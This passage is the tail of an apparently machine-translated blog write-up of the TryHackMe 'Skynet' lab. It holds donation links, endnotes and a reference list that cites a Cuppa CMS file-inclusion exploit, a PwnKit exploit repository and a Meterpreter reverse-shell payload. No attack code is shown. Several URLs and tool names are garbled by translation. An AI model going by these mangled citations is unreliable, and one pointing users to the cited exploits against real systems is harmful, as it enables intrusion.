id="a578" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">舒适的安东内尔:<a class="ae kz" href="https://cash.app/$CozyOdonell" rel="noopener ugc nofollow" target="_blank">https://cash.app/$CozyOdonell</a></li><li id="7f3b" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">詹姆斯·爱默生:https://cash.app/$octopuslaws8</li></ul><p id="84da" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，LGBTQ+群体正受到来自江湖骗子的攻击，如<a class="ae kz" href="https://rationalwiki.org/wiki/Matt_Walsh" rel="noopener ugc nofollow" target="_blank"/>和<a class="ae kz" href="https://www.washingtonpost.com/technology/2022/04/19/libs-of-tiktok-right-wing-media/" rel="noopener ugc nofollow" target="_blank"> libsoftiktok </a>这两个人的工作导致了对变性、同性恋和性别歧视的立法。我敦促读者支持或捐赠给以下组织，以对抗他们的错误信息:</p><ul class=""><li id="ac10" class="mo mp iu jt b ju jv jy jz kc ol kg om kk on ko oo mw mx my bi translated">美国公民自由联盟<em class="ky"/>:<a class="ae kz" href="https://www.aclu.org/" rel="noopener ugc nofollow" target="_blank">https://www.aclu.org/</a></li><li id="fb1d" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">人权运动<em class="ky"/>:<a class="ae kz" href="https://www.hrc.org/" rel="noopener ugc nofollow" target="_blank">https://www.hrc.org/</a></li></ul><h1 id="f95a" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">尾注</h1><ol class=""><li id="d590" class="mo mp iu jt b ju mq jy mr kc ms kg mt kk mu ko mv mw mx my bi translated">在这种情况下，<em class="ky">事件</em>被定义为“运行软件识别的一些动作、事件或‘外部刺激’，如击键或鼠标点击，从而改变其行为”，转述自<a class="ae kz" href="https://www.digitalocean.com/community/tutorials/nodejs-event-driven-programming" rel="noopener ugc nofollow" target="_blank"> Lane (2018) </a>。</li><li id="5bd4" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">我仔细检查了官方报道(<a class="ae kz" href="https://tryhackme.com/resources/blog/skynet-writeup" rel="noopener ugc nofollow" target="_blank"> Spring，2019 </a>)，看看我是否得到了正确的结果，或者需要使用不同的词汇表。我得到了和Spring几乎完全一样的结果；我所能做的就是保证，我尽了最大努力，不到必要的时候不会去看文章的其余部分。</li><li id="31c9" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">我不完全确定这个阶段的操作系统或内核版本是什么。</li></ol><h1 id="d68d" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">参考</h1><p id="b26b" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">“0xshroudri”(未注明)。<em class="ky">用户名_生成器. py </em>。GitHub库:<a class="ae kz" href="https://github.com/shroudri/username_generator" rel="noopener ugc nofollow" target="_blank">https://github.com/shroudri/username_generator</a></p><p id="0cdd" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">农业研究协会工作人员(2011年)。匿名发言:HBGary黑客事件的内幕。Ars技术公司。2022年10月25日检索自:<a class="ae kz" href="https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/" rel="noopener ugc nofollow" target="_blank">https://ars technica . com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-HB Gary-hack/</a></p><p id="8d7a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">贝拉尔迪博士。CVE-2021–4034。GitHub仓库。2022年10月25日检索自:【https://github.com/berdav/CVE-2021-4034/ T2】</p><p id="95a2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">打嗝组曲(未注明)。<em class="ky">应用安全测试软件</em>。PortSwigger。2022年9月30日检索自:<a class="ae kz" href="https://portswigger.net/burp" rel="noopener ugc nofollow" target="_blank">https://portswigger.net/burp</a></p><p id="7022" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Cuppa CMS(未注明)。2022年10月24日检索自:<a class="ae kz" href="https://www.cuppacms.com/" rel="noopener ugc nofollow" target="_blank">https://www.cuppacms.com/</a></p><p id="2db7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">CVE详情(未注明)。<em class="ky"> SquirrelMail:安全漏洞</em>。2022年9月30日检索自:<a class="ae kz" href="https://www.cvedetails.com/vulnerability-list/vendor_id-803/Squirrelmail.html" rel="noopener ugc nofollow" target="_blank">https://www . CVE details . com/vulnerability-list/vendor _ id-803/squirrel mail . html</a></p><p id="5f5c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《CWH地铁》(2013)。<em class="ky">Cuppa CMS—'/alert config field . PHP '本地/远程文件包含。利用数据库</em>。2022年10月24日检索自:<a class="ae kz" href="https://www.exploit-db.com/exploits/25971" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/25971</a></p><p id="e057" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">菲尔丁和雷施克(2014年)。<em class="ky">超文本传输协议(HTTP/1.1):语义和内容</em>【RFC 7231】。互联网工程任务组。2022年9月30日检索自:<a class="ae kz" href="https://datatracker.ietf.org/doc/html/rfc7231" rel="noopener ugc nofollow" target="_blank">https://datatracker.ietf.org/doc/html/rfc7231</a></p><p id="abe6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《弗兰克·托马斯》和《伽罗华》(2014)。如何使用smbclient递归下载目录？StackOverflow。2022年10月16日检索自:<a class="ae kz" href="https://superuser.com/a/856640" rel="noopener ugc nofollow" target="_blank">https://superuser.com/a/856640</a></p><p id="4dad" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">HowStuffWorks(未注明)。<em class="ky">如何用5个步骤画出一幅城市风景</em>。2022年10月25日检索自:<a class="ae kz" href="https://lifestyle.howstuffworks.com/crafts/drawing/how-to-draw-a-cityscape.htm" rel="noopener ugc nofollow" target="_blank">https://life style . how stuff works . com/crafts/drawing/how-to-draw-a-city scape . htm</a></p><p id="fce6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">信息安全事务(未注明)。<em class="ky"> SMB登录检查扫描器— Metasploit </em>。2022年10月15日检索自:<a class="ae kz" href="https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/smb/smb_login" rel="noopener ugc nofollow" target="_blank">https://www.infosecmatter.com/metasploit-module-library/?mm =辅助/扫描仪/SMB/SMB _登录</a></p><p id="b11a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">信息安全事务(未注明)。<em class="ky"> PHP Meterpreter，PHP反向TCP Stager — Metasploit </em>。2022年10月25日检索自:【https://www.infosecmatter.com/metasploit-module-library/? T2】mm = payload/PHP/meter preter/reverse _ TCP</p><p id="9968" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Kali Linux工具(未注明)。<em class="ky"> smbmap </em>。2022年9月30日检索自:<a class="ae kz" href="https://www.kali.org/tools/smbmap/" rel="noopener ugc nofollow" target="_blank">https://www.kali.org/tools/smbmap/</a></p><p id="fa37" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">莱恩河(2018)。<em class="ky">node . js中的事件驱动编程</em>。数字海洋。2018 . 9 . 30检索自:<a class="ae kz" href="https://www.digitalocean.com/community/tutorials/nodejs-event-driven-programming" rel="noopener ugc nofollow" target="_blank">https://www . digital ocean . com/community/tutorials/nodejs-event-driven-programming</a></p><p id="51ea" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Mehlmauer等人(未注明)。<em class="ky">OJ/gobuster:Go中写的目录/文件、DNS和VHost破坏工具</em>。GitHub仓库。2022年9月30日检索自:<a class="ae kz" href="https://github.com/OJ/gobuster" rel="noopener ugc nofollow" target="_blank">https://github.com/OJ/gobuster</a></p><p id="0f04" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Metasploit(未注明)。<em class="ky">渗透测试软件，笔测安全</em>。2022年10月15日检索自:<a class="ae kz" href="https://www.metasploit.com/" rel="noopener ugc nofollow" target="_blank">https://www.metasploit.com/</a></p><p id="7868" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">nmap(未标明)。Nmap:网络映射器——免费的安全扫描器。2022年9月3日检索自:<a class="ae kz" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/</a></p><p id="bf32" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">波特斯威格(未标明)。<em class="ky">打嗝入侵者攻击类型</em>。2022年9月30日检索自:<a class="ae kz" href="https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types" rel="noopener ugc nofollow" target="_blank">https://ports wigger . net/burp/documentation/desktop/tools/intrusor/attack-types</a></p><p id="106d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">波洛普角(未标明)。<em class="ky"> LinPEAS - Linux权限提升牛逼脚本。GitHub库</em>。2022年10月25日检索:<a class="ae kz" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="noopener ugc nofollow" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p><p id="3989" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Python 3.10.8文档(未注明)。<em class="ky"> http.server — HTTP服务器</em>。2022年10月24日检索自:<a class="ae kz" href="https://docs.python.org/3/library/http.server.html" rel="noopener ugc nofollow" target="_blank">https://docs.python.org/3/library/http.server.html</a></p><p id="10ac" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">快速表格(未注明)。<em class="ky">二进制到文本转换器</em>。2022年10月15日检索自:<a class="ae kz" href="https://www.rapidtables.com/convert/number/binary-to-ascii.html" rel="noopener ugc nofollow" target="_blank">https://www . rapid tables . com/convert/number/binary-to-ascii . html</a></p><p id="656b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">SMB客户端(未标明)。2022年9月30日检索自:<a class="ae kz" href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html" rel="noopener ugc nofollow" target="_blank">https://www . samba . org/samba/docs/current/man-html/SMB client . 1 . html</a></p><p id="3428" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">春天，B. (2019)。<em class="ky">天网——记起</em>。TryHackMe。2022年9月30日检索自:<a class="ae kz" href="https://tryhackme.com/resources/blog/skynet-writeup" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/resources/blog/skynet-writeup</a></p><p id="893f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">松鼠邮件(未注明日期)。<em class="ky">坚果网邮</em>。2022年9月30日检索自:<a class="ae kz" href="https://squirrelmail.org/" rel="noopener ugc nofollow" target="_blank">https://squirrelmail.org/</a></p><p id="bee5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《tryhackme》(2019)。<em class="ky">天网:易受攻击的终结者主题Linux机器</em>。TryHackMe。2022年8月9日检索自:<a class="ae kz" href="https://tryhackme.com/room/skynet" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/skynet</a></p><p id="5f0f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“范·豪泽”(未注明)。<em class="ky"> thc-hydra </em>。GitHub仓库。2022年9月30日检索自:<a class="ae kz" href="https://github.com/vanhauser-thc/thc-hydra" rel="noopener ugc nofollow" target="_blank">https://github.com/vanhauser-thc/thc-hydra</a></p><p id="7f6b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">墙纸耀斑(未标明)。<em class="ky">高清壁纸:女子骑摩托车插画</em>。2022年10月25日检索自:<a class="ae kz" href="https://www.wallpaperflare.com/woman-riding-motorcycle-illustration-fate-series-anime-anime-girls-wallpaper-ptdsp" rel="noopener ugc nofollow" target="_blank">https://www . wallpaperflare . com/woman-riding-motorcycle-illustration-fate-series-anime-anime-girls-wallpaper-pt DSP</a></p></div><div class="ab cl ov ow hy ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="in io ip iq ir"><h2 id="96f4" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kz" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>